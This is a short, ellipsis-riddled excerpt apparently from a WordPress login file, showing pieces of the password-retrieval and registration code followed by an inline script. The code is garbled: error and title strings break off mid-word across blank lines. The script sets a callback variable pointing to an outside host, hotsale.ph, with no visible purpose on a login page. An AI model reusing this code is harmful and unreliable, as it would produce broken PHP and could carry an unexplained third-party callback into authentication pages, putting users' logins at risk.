...
function retrieve_password() {
	...
	if ( empty( $_POST['user_login'] ) ) {
		...
		if ( empty( $user_data ) )
			$errors->add('invalid_email', __('<strong>ERROR</strong>: There is no user 
			
			ed with that email address.'));
	} else {
...
case 'register' :
	...
	login_header(__('Registration 
	'), '<p class="message register">' . __('Register For This Site') . '</p>', $errors);
?>
...
<script type="text/javascript">
  ...
  var your_callback_script = 'http://hotsale.ph/callback_handler.php';
